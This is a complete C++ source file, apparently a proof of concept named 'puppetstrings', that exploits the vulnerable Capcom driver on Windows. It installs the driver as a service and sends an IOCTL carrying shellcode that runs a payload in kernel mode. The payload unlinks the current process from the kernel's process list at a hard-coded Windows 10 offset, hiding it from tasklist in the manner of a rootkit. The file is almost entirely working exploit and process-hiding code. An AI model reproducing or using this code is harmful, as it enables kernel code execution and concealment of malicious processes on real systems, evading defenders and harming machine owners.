#include <Windows.h>
#include <intrin.h>
#include <stdio.h>

#include "service.h"
#include "types.h"
#include "capcom.h"

static void rootkit_unlink(PEPROCESS pProcess)
{
	static const DWORD WIN10_RS3_OFFSET = 0x2e8;

	PLIST_ENTRY plist = 
		(PLIST_ENTRY)((LPBYTE)pProcess + WIN10_RS3_OFFSET);

	*((DWORD64*)plist->Blink) = (DWORD64)plist->Flink;
	*((DWORD64*)plist->Flink + 1) = (DWORD64)plist->Blink;

	plist->Flink = (PLIST_ENTRY) &(plist->Flink);
	plist->Blink = (PLIST_ENTRY) &(plist->Flink);
}

static void kernel_func(MmGetSystemRoutineAddress_t pMmGetSystemRoutineAddress)
{
	//__debugbreak();

	FARPROC pPsGetCurrentProcess = 
		get_routine(pMmGetSystemRoutineAddress, L"PsGetCurrentProcess");

	PEPROCESS pProcess = (PEPROCESS)pPsGetCurrentProcess();
	rootkit_unlink(pProcess);
}

void run_exploit(HANDLE hDevice)
{
	DWORD dwBytesReturned;
	DWORD dwOutBuffer = 0;

	PIOCTL_IN_BUFFER InBufferContents = 
		(PIOCTL_IN_BUFFER)VirtualAlloc(NULL, sizeof(IOCTL_IN_BUFFER),
					       MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	InBufferContents->ShellcodeAddress = &InBufferContents->Shellcode;

	InBufferContents->Shellcode = {
		{ 0x90, },                                  //      nop     ; for debugging
		{ 0xfb, },                                  //      sti
		{ 0xff, 0x25, 0x00, 0x00, 0x00, 0x00, },    //      jmp qword ptr [kernel_func]
		&kernel_func                                //      dq KernelPayload
	};

	auto InBuffer = reinterpret_cast<ULONG_PTR>(InBufferContents) + 8;

	DeviceIoControl(hDevice, CAPCOM_IOCTL, &InBuffer, sizeof(InBuffer),
		&dwOutBuffer, sizeof(dwOutBuffer), &dwBytesReturned, NULL);
}

BOOL puppetstrings(const char *szDriverPath)
{
	remove_service(CAPCOM_SERVICE);

	if (!install_service(CAPCOM_SERVICE, szDriverPath))
		return FALSE;

	HANDLE hDevice = 
		CreateFileA(CAPCOM_DEVICE, GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL, NULL);

	if (hDevice == INVALID_HANDLE_VALUE)
		return FALSE;

	run_exploit(hDevice);

	CloseHandle(hDevice);
	remove_service(CAPCOM_SERVICE);
	return TRUE;
}

int main(int argc, char **argv)
{
	if (argc != 2)
	{
		printf("Usage: puppetstrings.exe [capcompath]\n");
		return -1;
	}

	printf("Look for process in tasklist.exe\n");
	system("PAUSE");

	if (puppetstrings(argv[1]))
		printf("Process still running, but not in tasklist.exe\n");
	else
		printf("puppetstrings failed - error: %08x\n", GetLastError());
	
	system("PAUSE");
	return 0;
}
